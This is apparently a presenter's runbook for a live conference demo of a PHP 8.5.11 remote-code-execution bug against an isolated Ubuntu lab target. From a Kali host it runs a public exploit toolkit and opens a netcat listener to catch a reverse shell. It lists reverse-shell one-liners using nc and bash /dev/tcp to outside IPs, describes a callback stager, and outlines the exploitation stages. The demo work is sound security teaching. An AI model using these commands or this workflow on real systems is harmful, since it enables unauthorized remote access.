# Stage runbook — PHP2Shell with the Ubuntu + Kali lab

This document connects the lab (`ubuntu-lab/`) to the talk slides. The idea is
that you never have to decide anything on stage: each demo has **one** command,
**one** expected output and **one** emergency exit.

> Important difference from the deck: slides 7/9/12/14 show
> `python3 php2shell.py ...`, that is, the harness from the `exploit/` directory.
> That harness **does not implement** the RCE stage (`stage_run()` returns
> `"grooming and control-flow hijack not implemented yet"`). What works is the
> public toolkit (`devploit/php2shell`), which is what `p2s-run.sh` calls.
> Two ways out: (a) change the command on the slide, or (b) say out loud "the
> command is the same, only the wrapper changes". I recommend (a) — see the
> "Deck adjustments" section at the end.

---

## 0. Setup (T-60 min)

### Ubuntu (target)

```bash
sudo apt update && sudo apt install -y git
# copy the ubuntu-lab/ directory to the VM (scp, USB stick, git clone)
cd ~/ubuntu-lab
sudo ./install.sh --lhost <KALI-IP> --lport 4444
```

The installer prints a block with the target IP. Keep it.

### Kali (attacker)

```bash
cd ~/ubuntu-lab
sudo ./kali/setup-kali.sh          # installs the public toolkit + ncat/rlwrap
```

Confirm the three things that break the demo:

```bash
curl -s http://<UBUNTU>:8080/ping.php     # version=8.5.11 and one pid=
curl -s http://<UBUNTU>:8080/ping.php     # SAME pid=  ← critical
ip -br a | grep -v lo                     # IP that goes in --lhost
```

If `pid=` changes between the two calls, **stop and fix it before going on
stage** (`docs/TROUBLESHOOTING.md`, item 3).

### Screens

| Pane | Content | Source |
|------|---------|--------|
| 1 | listener (`nc`) | Kali, large terminal |
| 2 | `p2s-run.sh` | Kali, large terminal |
| 3 | slides | laptop |
| 4 | browser at `http://<UBUNTU>:8080/` | optional, for slide 6 |

Increase the font in both terminals. Nobody reads 11 pt on a projector.

---

## 1. Slide 6 — the application (2 min, before any exploit)

Open the site in pane 4. It is "Photo Drop": image upload, gallery, download,
and a `ping.php` diagnostics page.

Talk, pointing at the code on the slide:

> "About a hundred and eighty lines, almost half of it HTML. No `eval`, no
> dynamic `include`, no `shell_exec`, no `unserialize`. I do not even call
> `session_start()`. The bug is not here — it is in the engine that executes
> this file."

Show the upload working. That establishes that the app is honest, and that the
flaw is not "the speaker's bad code".

---

## 2. Slide 7 — DEMO 1 · waking up the worker

**Goal:** prove that both requests land on the same process and that the target
is 8.5.11. No exploit yet.

```bash
cd ~/ubuntu-lab
./kali/p2s-run.sh --target http://<UBUNTU>:8080 --step proof
```

The script runs the pre-flight check (it prints `pid=` and compares two calls)
and fires:

```
STEP 1/2 · proof of execution (id>p1) · command 'id>p1' (5 bytes; carrier limit: 14)
...
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Talk while it runs (~10–15 s):

> "This is not a shell. It is a file write: the remote command is `id>p1`,
> five bytes. The carrier limit is fourteen. The proof is that the file `p1`
> appears in the docroot and I fetch it over HTTP."

**Honesty point (say it):** `display_errors=On` and a writable docroot are lab
switches. The advisory lists `display_errors=Off` as what blocks the published
leak — hardening removes *this* path, it does not close the bug.

---

## 3. Slide 10 — the seven stages

Do not run anything here. The slide is the map; the demo already happened. One
sentence per stage, 15 s each:

| Stage | What to say |
|-------|-------------|
| S0 fingerprint | "Version, SAPI and effective ini — for free, over HTTP." |
| S1 pinning | "I need the **same** process on both ends. In the lab, a single worker turns that into an invariant; in production there are 150 and it becomes a race." |
| S2 arm | "I publish state and die before the reset." |
| S3 probe | "The next request reads what is left over." |
| S4 leak | "The pointer leaks through `upload_progress`." |
| S5 control | "I rewrite the `zend_string` and `zif_system` becomes mine." |
| S6 exec | "A `system()` at shutdown. That is where the shell is born." |

If someone asks "why the shutdown": that is where PHP releases the request's
resources — and it is the moment when the already-freed object is used again.

---

## 4. Slide 12 — DEMO 3 · one command, as www-data

**This is the climax.** Two terminals, in this exact order.

### Pane 1 (Kali) — open the listener FIRST

```bash
cd ~/ubuntu-lab
./kali/p2s-listen.sh --lport 4444
```

It must print `[*] listening on 0.0.0.0:4444`.

### Pane 2 (Kali) — fire

```bash
./kali/p2s-run.sh --target http://<UBUNTU>:8080 --step shell
```

The remote command is `sh stage/s` — 10 bytes. `install.sh` already left that
stager in the docroot with the Kali IP embedded. The script announces:

```
STEP 2/2 · reverse shell (sh stage/s) · command 'sh stage/s' (10 bytes; carrier limit: 14)
```

In ~10–15 s pane 2 prints the verdict (`system()` returns no body, so the driver
reads the stager log at `/p2s-stage.log`) and pane 1 shows the prompt:

```
╭─ RESULT: SHELL OK ────────────────────────────────────────
│ the stager ran and the listener accepted the TCP connection
│ stager: 2026-11-19T13:23:42Z pid=298 uid=33 cwd=/var/www/html lhost=192.0.2.50 lport=4444
│ stager: 2026-11-19T13:23:42Z connect-ok uid=33
╰──────────────────────────────────────────────
```

### Script with the shell open

```bash
id                      # uid=33(www-data): this is Apache, not root
hostname
php -v | head -1        # PHP 8.5.11 — the vulnerable version, in production
ls /var/www/html
cat /var/www/html/stage/s   # the stager I just executed
```

Close with:

> "No webshell upload, no `eval`, no plugin. The process that gave me a shell is
> the same one that was serving the page two minutes ago."

### Why `sh stage/s` and not a one-liner

The carrier holds **14 bytes**. No classic reverse shell fits:

| Command | Bytes | Fits? |
|---------|-------|-------|
| `id>p1` | 5 | yes |
| `sh stage/s` | 10 | yes |
| `nc 192.0.2.10 4444` | 21 | no |
| `bash -i>&/dev/tcp/1.2.3.4/4444` | 31 | no |

The stager uses `/bin/bash` with `/dev/tcp` (the `php:8.5.11-apache` image ships
bash), runs in the background with `setsid` and exits immediately to free the
worker. It records what it did in `/tmp/p2s-stager.log` — that is the first
place to look if the shell does not appear.

**How to explain this without it looking like cheating:** the stager is the
*payload*, not the *exploit*. It is there because the execution primitive only
accepts 14 bytes. In a real campaign, the attacker would use the same channel to
fetch the next stage.

---

## 5. Slide 14 — DEMO 4 · the same request on 8.5.12 (optional)

The `ubuntu-lab/` package brings up only the vulnerable target **on purpose**:
every extra demo is one more thing to break on stage. If you want the
side-by-side comparison, bring the fixed one up in parallel:

```bash
sudo docker run -d --name p2s-ubuntu-fixed -p 8081:80 \
  -v ~/ubuntu-lab/app:/var/www/html \
  -v ~/ubuntu-lab/storage:/var/www/storage \
  -v ~/ubuntu-lab/docker/php.ini:/usr/local/etc/php/conf.d/zz-p2s.ini:ro \
  -v ~/ubuntu-lab/docker/apache-lab.conf:/etc/apache2/conf-enabled/zz-p2s.conf:ro \
  -e P2S_DEBUG=1 \
  php:8.5.12-apache
```

Then:

```bash
curl -s http://<UBUNTU>:8081/ping.php     # version=8.5.12
./kali/p2s-run.sh --target http://<UBUNTU>:8081 --step proof
```

The expectation is that the toolkit refuses or the pre-flight check blocks it:
**8.5.12 is the fixed release**. Say:

> "Same binary, same application, same request. One patch changes. That is the
> difference between a demo and an incident."

The `php:8.5.12-apache` tag exists on Docker Hub (checked on 2026-11). If it
disappears before the talk, use any `8.5.x` above the fix — the argument is the
same. If none of it is ready, **cut the demo** and show the slide with timeline
numbers; do not improvise live.

---

## 6. Between runs

The chain kills the Apache children (`zif_system` at shutdown). The container
stays up, but the heap is left dirty. Before repeating:

```bash
ssh <user>@<UBUNTU> 'cd ~/ubuntu-lab/docker && sudo docker compose restart'
```

Rule of thumb: **one attempt per restart**. Two attempts in a row on the same
instance is where the demo usually dies.

---

## 7. Plan B (decide beforehand, not on stage)

Fallback ladder, in order:

1. **Restart + repeat** (30 s). Fixes most cases.
2. **The proof only** (`--step proof`). `uid=33(www-data)` is already RCE; the
   shell is a convenience. Say so and move on.
3. **Video.** Have a `demo3.mp4` recorded from the rehearsal that worked, with
   the shell opening and `id` answering. Announce it: "I recorded it because
   conferences have Wi-Fi". Nobody penalizes that.
4. **Screenshots** on the backup slide, with the prompt and `uid=33` visible.

What **not** to do: spend 4 minutes debugging live. The audience loses the
thread of the argument and you lose the time of slides 15–18.

Numbers to know by heart: ports `8080` (target) and `4444` (listener), the IPs of
both VMs, and the lab path (`~/ubuntu-lab`).

---

## 8. Teardown (after the talk)

```bash
cd ~/ubuntu-lab
sudo ./uninstall.sh --purge      # tears down the container and deletes stager + storage
```

Do this **before** plugging the VM into any network other than the event one.
`--purge` removes the stager, which is a working reverse shell waiting for an IP.

---

## 9. Deck adjustments (recommended)

| Slide | Shows today | Suggestion |
|-------|-------------|------------|
| 7 | `python3 php2shell.py arm --strategy session` | `./p2s-run.sh --step proof` (or keep it and explain that it is the wrapper) |
| 12 | `python3 php2shell.py run --cmd 'id > proof.txt'` | `./p2s-run.sh --step shell` — `php2shell.py run` does **not** work today |
| 14 | `python3 php2shell.py arm --url 127.0.0.1:8512` | same; or cut the demo and stay on the slide |

The reason is objective: `stage_run()` in `exploit/p2s/stages.py` returns
`"grooming and control-flow hijack not implemented yet"`. If the slide shows a
command that does not run, someone in the audience will try it afterwards and
will ask you about it.

---

## 10. What this lab *does not* prove

* It is **not** an independent reproduction of the CVE: it uses the verified
  profile from the public toolkit for the `php:8.5.11-apache` image.
* It does **not** demonstrate exploitation in production: `display_errors=On`,
  `memory_limit=8M` and a writable docroot are lab preconditions, listed in the README.
* It does **not** replace the original lab (`victim-vuln` 8511 / `victim-fixed`
  8512 / `victim-asan` 8513) for demos 1, 2 and 4. It is the "real" target, on
  another host, for the moment when you want a shell and not an ASan dump.
